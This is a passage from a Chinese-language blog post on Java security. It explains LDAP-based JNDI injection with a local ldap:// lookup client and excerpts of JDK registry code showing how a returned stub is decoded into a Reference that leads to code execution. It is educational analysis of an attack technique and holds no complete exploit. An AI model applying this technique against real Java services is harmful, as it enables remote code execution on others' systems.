+<h3 id="LDAP-JNDI注入"><a href="#LDAP-JNDI注入" class="headerlink" title="LDAP+JNDI注入"></a>LDAP+JNDI注入</h3><p>除了RMI实现JNDI注入外，同样LDAP也可以实现JNDI注入，同RMI来对比，<code>LDAP</code>服务的<code>Reference</code>远程加载Factory类不受上一点中 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>等属性的限制，不过在之后的版本，也对这些属性进行了限制，如 对com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false.</p>
+<p>JNDIClient</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LDAPClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String uri = <span class="string">"ldap://127.0.0.1:8088/aa"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        String uri = "rmi://127.0.0.1:1099/aa";</span></span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.ax1x.com/2020/02/27/30g2BF.png" alt="30g2BF.png"></p>
+<p>调用过程和RMI触发JNDI差不多，就不详细分析了。</p>
+<h4 id="LDAP触发JNDI注入的限制"><a href="#LDAP触发JNDI注入的限制" class="headerlink" title="LDAP触发JNDI注入的限制"></a>LDAP触发JNDI注入的限制</h4><p>其实和RMI的差不多，就不再赘述了。</p>
+<h3 id="关于JNDI注入的一个问题"><a href="#关于JNDI注入的一个问题" class="headerlink" title="关于JNDI注入的一个问题"></a>关于JNDI注入的一个问题</h3><p>这个问题是看Seebug发现的，不过在调试RMI 触发的这个过程正好可以解决这个问题，文章的作者也给了很详细的说明</p>
+<blockquote>
+<p>Q:oC 里面向 rmi registry 绑定 ReferenceWrapper 的时候，真正绑定进去的应该是它的 Stub 才对，Stub 的对象是怎么造成客户端的代码执行的。</p>
+</blockquote>
+<p>对于这段代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RegistryContext(<span class="keyword">this</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Remote var2;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = <span class="keyword">this</span>.registry.lookup(var1.get(<span class="number">0</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NameNotFoundException(var1.get(<span class="number">0</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var5).fillInStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.decodeObject(var2, var1.getPrefix(<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码的主要作用是从registry中拿出远程对象赋给var2,并且这个var2为stud类型</p>
+<p>关键在于下一段的代码处理</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Object var3 = var1 <span class="keyword">instanceof</span> RemoteReference ?</span><br><span class="line">                ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">        <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, </span><br><span class="line">                <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var5;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">        NamingException var4 = <span class="keyword">new</span> NamingException();</span><br><span class="line">        var4.setRootCause(var7);</span><br><span class="line">        <span class="keyword">throw</span> var4;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>decodeObject</code> 函数将 stub 还原成了 Reference，所以才可以造成代码执行。</p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://paper.seebug.org/417/" target="_blank" rel="noopener">https://paper.seebug.org/417/</a></p>
+<p><a href="https://www.smi1e.top/java代码审计学习之jndi注入/" target="_blank" rel="noopener">https://www.smi1e.top/java%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1%e5%ad%a6%e4%b9%a0%e4%b9%8bjndi%e6%b3%a8%e5%85%a5/</a></p>
+<p><a href="https://xz.aliyun.com/t/6633#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/6633#toc-5</a></p>
+<p><a href="https://www.cnblogs.com/tr1ple/p/11558842.html" target="_blank" rel="noopener">https://www.cnblogs.com/tr1ple/p/11558842.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web/" rel="tag"># Web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/02/28/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80-Class%E5%AF%B9%E8%B1%A1%E4%B8%8E%E5%8F%8D%E5%B0%84/" rel="next" title="Java安全学习(一)--Class对象与反射">
+                <i class="fa fa-chevron-left"></i> Java安全学习(一)--Class对象与反射
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/02/29/Myucms-2-1-SQL%E6%B3%A8%E5%85%A5%E5%8A%A0%E5%90%8E%E5%8F%B0getshell/" rel="prev" title="Myucms 2.1 SQL注入加后台getshell">
+                Myucms 2.1 SQL注入加后台getshell <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">离怀秋</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">72</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/lihuaiqiu" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://southseast.cc" title="南溟师傅" target="_blank">南溟师傅</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#基本概念介绍"><span class="nav-number">1.</span> <span class="nav-text">基本概念介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RMI"><span class="nav-number">2.</span> <span class="nav-text">RMI</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#RMI的调用机制"><span class="nav-number">2.0.1.</span> <span class="nav-text">RMI的调用机制</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#RMI调用过程"><span class="nav-number">2.0.2.</span> <span class="nav-text">RMI调用过程</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RMI-JNDI注入"><span class="nav-number">3.</span> <span class="nav-text">RMI+JNDI注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#RMI-JNDI注入原理"><span class="nav-number">3.1.</span> <span class="nav-text">RMI+JNDI注入原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#RMI触发JNDI的限制"><span class="nav-number">3.2.</span> <span class="nav-text">RMI触发JNDI的限制</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LDAP-JNDI注入"><span class="nav-number">4.</span> <span class="nav-text">LDAP+JNDI注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#LDAP触发JNDI注入的限制"><span class="nav-number">4.1.</span> <span class="nav-text">LDAP触发JNDI注入的限制</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#关于JNDI注入的一个问题"><span class="nav-number">5.</span> <span class="nav-text">关于JNDI注入的一个问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考链接"><span class="nav-number">6.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">离怀秋</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count"></span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
